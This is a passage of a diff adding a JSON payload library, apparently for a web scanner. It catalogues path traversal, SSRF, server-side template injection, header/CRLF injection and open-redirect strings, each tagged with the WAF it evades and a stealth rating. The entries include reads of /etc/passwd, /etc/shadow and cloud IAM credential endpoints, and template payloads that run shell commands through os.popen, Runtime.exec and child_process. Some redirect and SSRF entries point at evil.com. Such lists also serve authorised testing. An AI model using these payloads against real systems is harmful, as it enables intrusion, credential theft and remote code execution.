+        "technique": "null_byte_dir",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "/etc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "absolute_path",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "file:///etc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "file_uri",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "....//etc/passwd",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "double_dot_slash",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..././..././..././etc/passwd",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "dot_stripping_bypass",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "/%5C../%5C../%5C../etc/passwd",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "encoded_backslash",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "/..%255c..%255c..%255cetc/passwd",
+        "waf_targets": [
+          "imperva",
+          "aws_waf"
+        ],
+        "technique": "double_encoded_backslash",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "..0x2f..0x2f..0x2fetc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "hex_slash",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%c1%1c..%c1%1c..%c1%1cetc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "utf8_overlong_backslash",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "....//....//....//etc/passwd",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "double_slash",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%u2215..%u2215..%u2215etc/passwd",
+        "waf_targets": [
+          "imperva"
+        ],
+        "technique": "unicode_division_slash",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "..%u2216..%u2216..%u2216etc\\passwd",
+        "waf_targets": [
+          "imperva"
+        ],
+        "technique": "unicode_set_minus",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "/proc/self/environ",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "proc_environ",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "/proc/self/fd/0",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "proc_fd",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "php://filter/convert.base64-encode/resource=/etc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "php_filter",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "php://input",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "php_input",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "expect://id",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "expect_wrapper",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "data_wrapper",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "windows_deep_traversal",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "encoded_windows_traversal",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "C:\\boot.ini",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "windows_absolute",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "\\\\localhost\\c$\\windows\\win.ini",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "unc_path",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "../../../../../../../etc/shadow",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "deep_traversal",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "..%2f..%2f..%2f..%2f..%2fetc%2fshadow",
+        "waf_targets": [
+          "cloudflare"
+        ],
+        "technique": "encoded_deep_traversal",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "....//....//....//....//etc//shadow",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "nested_double_slash",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%00/../../../etc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "null_byte_mid",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..///////../////../////etc/passwd",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "excess_slashes",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%2f%2f..%2f%2f..%2f%2fetc%2fpasswd",
+        "waf_targets": [
+          "cloudflare"
+        ],
+        "technique": "encoded_double_slash",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%5c..%5c..%5cetc%5cpasswd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "backslash_unix",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "/var/log/apache2/access.log",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "log_inclusion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "/var/log/nginx/access.log",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "log_inclusion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "windows_config_read",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "WEB-INF/web.xml",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "java_config_read",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%c0%ae..%c0%ae..%c0%aeetc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "utf8_overlong_dot",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ".%2e/.%2e/.%2e/etc/passwd",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "partial_encode_dot",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%2e./%2e./%2e./etc/passwd",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "partial_encode_lead_dot",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%bg%qf..%bg%qfetc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "invalid_utf8",
+        "stealth_rating": "high"
+      }
+    ],
+    "ServerSideRequestForgery": [
+      {
+        "raw": "http://127.0.0.1/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "localhost_ip",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "http://0x7f000001/",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "hex_ip",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://2130706433/",
+        "waf_targets": [
+          "generic",
+          "cloudflare",
+          "aws_waf"
+        ],
+        "technique": "decimal_ip",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://0177.0.0.1/",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "octal_ip",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://0/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "zero_ip",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://[::1]/",
+        "waf_targets": [
+          "generic",
+          "aws_waf"
+        ],
+        "technique": "ipv6_localhost",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://[::ffff:127.0.0.1]/",
+        "waf_targets": [
+          "generic",
+          "aws_waf"
+        ],
+        "technique": "ipv6_mapped",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+        "waf_targets": [
+          "aws_waf"
+        ],
+        "technique": "ipv6_full_mapped",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://127.1/",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "short_ip",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://127.0.1/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "partial_ip",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://0.0.0.0/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "all_zeros",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://localtest.me/",
+        "waf_targets": [
+          "generic",
+          "cloudflare",
+          "aws_waf"
+        ],
+        "technique": "dns_rebinding",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://spoofed.burpcollaborator.net/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "oob_dns",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://127.0.0.1.nip.io/",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "wildcard_dns",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://customer.localhost/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "localhost_subdomain",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://127.0.0.1:80/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "explicit_port",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "http://127.0.0.1:443/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "https_port",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "http://127.0.0.1:8080/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "alt_port",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "http://0x7f.0x0.0x0.0x1/",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "hex_octets",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://0177.0000.0000.0001/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "octal_full",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "gopher://127.0.0.1:25/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "gopher_protocol",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "dict://127.0.0.1:11211/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "dict_protocol",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "ftp://127.0.0.1/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "ftp_protocol",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "file:///etc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "file_protocol",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://169.254.169.254/latest/meta-data/",
+        "waf_targets": [
+          "aws_waf"
+        ],
+        "technique": "aws_metadata",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "waf_targets": [
+          "aws_waf"
+        ],
+        "technique": "aws_iam_creds",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://metadata.google.internal/computeMetadata/v1/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "gcp_metadata",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://169.254.169.254/metadata/v1/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "digitalocean_metadata",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://100.100.100.200/latest/meta-data/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "alibaba_metadata",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://169.254.169.254/openstack/latest/meta_data.json",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "openstack_metadata",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://0xA9FEA9FE/",
+        "waf_targets": [
+          "aws_waf",
+          "cloudflare"
+        ],
+        "technique": "hex_metadata_ip",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://2852039166/",
+        "waf_targets": [
+          "aws_waf",
+          "cloudflare"
+        ],
+        "technique": "decimal_metadata_ip",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://0251.0376.0251.0376/",
+        "waf_targets": [
+          "aws_waf"
+        ],
+        "technique": "octal_metadata_ip",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://[::ffff:169.254.169.254]/",
+        "waf_targets": [
+          "aws_waf"
+        ],
+        "technique": "ipv6_metadata",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://127.0.0.1%23@evil.com/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "fragment_bypass",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://evil.com@127.0.0.1/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "auth_bypass",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://127.0.0.1#evil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "fragment_confusion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://127.0.0.1%00@evil.com/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "null_byte_auth",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://127.0.0.1/latest/meta-data/?url=http://evil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "param_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "https://127.0.0.1/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "https_localhost",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "http://127.0.0.1./",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "trailing_dot",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://\u2460\u2461\u2466.\u24ea.\u24ea.\u2460/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "unicode_digits",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://127.0.0.1:80@evil.com/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "port_auth_confusion",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://\\\\127.0.0.1/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "backslash_url",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "jar:http://127.0.0.1!/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "jar_protocol",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://127.0.0.1%E3%80%82/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "unicode_dot",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://127%2E0%2E0%2E1/",
+        "waf_targets": [
+          "cloudflare",
+          "aws_waf"
+        ],
+        "technique": "encoded_dots",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://0000::1/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "ipv6_compressed",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://127.000.000.001/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "padded_ip",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://127.0.0.1/admin/../",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "path_traversal_ssrf",
+        "stealth_rating": "medium"
+      }
+    ],
+    "ServerSideTemplateInjection": [
+      {
+        "raw": "{{7*7}}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "basic_expression",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "${7*7}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "dollar_expression",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "#{7*7}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "hash_expression",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "<%= 7*7 %>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "erb_expression",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "jinja2_rce",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "{{''.__class__.__mro__[2].__subclasses__()}}",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "jinja2_subclass_enum",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['sys'].modules['os'].popen('id').read() }}{% endif %}{% endfor %}",
+        "waf_targets": [
+          "cloudflare",
+          "modsecurity"
+        ],
+        "technique": "jinja2_loop_rce",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "flask_rce",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
+        "waf_targets": [
+          "cloudflare"
+        ],
+        "technique": "jinja2_cycler_rce",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "{{''.class.mro[2].subclasses()}}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "dot_notation_bypass",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "{{lipsum.__globals__['os'].popen('id').read()}}",
+        "waf_targets": [
+          "cloudflare",
+          "modsecurity"
+        ],
+        "technique": "jinja2_lipsum",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "{{joiner.__init__.__globals__['os'].popen('id').read()}}",
+        "waf_targets": [
+          "cloudflare"
+        ],
+        "technique": "jinja2_joiner",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "{{namespace.__init__.__globals__['os'].popen('id').read()}}",
+        "waf_targets": [
+          "cloudflare"
+        ],
+        "technique": "jinja2_namespace",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "spring_el_rce",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "*{T(java.lang.Runtime).getRuntime().exec('id')}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "thymeleaf_rce",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "freemarker_rce",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "freemarker_assign",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "pug_rce",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "handlebars_rce",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "{{:''.class.base.subclasses()}}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "twig_enum",
+        "stealth_rating": "medium"
+      }
+    ],
+    "HeaderInjection": [
+      {
+        "raw": "value\\r\\nX-Injected: true",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "crlf_header",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "value%0d%0aX-Injected:%20true",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "encoded_crlf",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value%0d%0a%0d%0a<script>alert(1)</script>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "crlf_body_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value%E5%98%8A%E5%98%8DX-Injected:%20true",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "unicode_crlf",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "value\\nX-Injected: true",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "lf_only",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value%0aX-Injected:%20true",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "encoded_lf",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value\\r\\nSet-Cookie: session=evil",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "cookie_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value%0d%0aSet-Cookie:%20session=evil",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "encoded_cookie_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value\\r\\nLocation: http://evil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "redirect_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value%0d%0aLocation:%20http://evil.com",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "encoded_redirect",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\n",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "response_splitting",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "encoded_splitting",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value\\r\\nTransfer-Encoding: chunked",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "te_injection",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "value\\r\\nX-Forwarded-For: 127.0.0.1",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "xff_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value%0d%0aX-Forwarded-Host:%20evil.com",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "xfh_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value%c4%8d%c4%8aX-Injected: true",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "utf8_crlf",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "value%00%0d%0aX-Injected: true",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "null_then_crlf",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "value\\r\\nHost: evil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "host_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value%0d%0aAccess-Control-Allow-Origin:%20*",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "cors_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "value%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "content_type_override",
+        "stealth_rating": "medium"
+      }
+    ],
+    "OpenRedirect": [
+      {
+        "raw": "//evil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "protocol_relative",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "/\\evil.com",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "backslash_redirect",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "https://evil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "absolute_url",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "http://evil.com%2f@trusted.com/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "encoded_slash_auth",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "https://trusted.com@evil.com/",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "auth_confusion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "//evil.com/%2f%2e%2e",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "encoded_traversal_redirect",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "///evil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "triple_slash",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "////evil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "quad_slash",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "https:evil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "missing_slashes",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "javascript:alert(document.domain)//",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "javascript_redirect",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "//evil%E3%80%82com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "unicode_dot_domain",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "/%0d/evil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "cr_redirect",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://evil.com:80#@trusted.com/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "fragment_auth",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "http://evil.com%23@trusted.com/",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "encoded_fragment",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "%68%74%74%70%73%3a%2f%2fevil.com",
+        "waf_targets": [
+          "generic",
+          "aws_waf"
+        ],
+        "technique": "full_url_encode",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "https://evil.com/../../trusted.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "traversal_redirect",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "data:text/html,<script>location='http://evil.com'</script>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "data_uri_redirect",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "//evil\u3002com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "unicode_fullwidth_dot",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "//%0devil.com",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "cr_domain",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "http://trusted.com.evil.com/",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "subdomain_confusion",
+        "stealth_rating": "medium"
+      }
+    ],
+    "CrlfInjection": [
+      {
+        "raw": "%0d%0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "basic_crlf",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "%0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "lf_only",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "%0d",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "cr_only",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "%E5%98%8A%E5%98%8D",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "unicode_crlf",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "%c4%8d%c4%8a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "utf8_crlf",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "\\r\\n",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "literal_crlf",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "%250d%250a",
+        "waf_targets": [
+          "generic",
+          "aws_waf",
+          "imperva"
+        ],
+        "technique": "double_url_encode",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%%0d0d%%0a0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "double_percent",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%25%30%64%25%30%61",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "triple_encode",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "%0d%0aSet-Cookie:evil=true",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "cookie_via_crlf",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%0d%0a%0d%0a<html>injected</html>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "body_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%0d%0aContent-Length:0%0d%0a%0d%0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "smuggling_crlf",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "%0d%0aLocation:http://evil.com%0d%0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "redirect_via_crlf",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%0d%0aHost:evil.com%0d%0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "host_via_crlf",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%00%0d%0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "null_prefix_crlf",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "%0d%20%0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "space_padded_crlf",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%0d%09%0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "tab_padded_crlf",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d",
+        "waf_targets": [
+          "cloudflare"
+        ],
+        "technique": "double_unicode_crlf",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "%0d%0aX-Forwarded-For:127.0.0.1%0d%0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "xff_via_crlf",
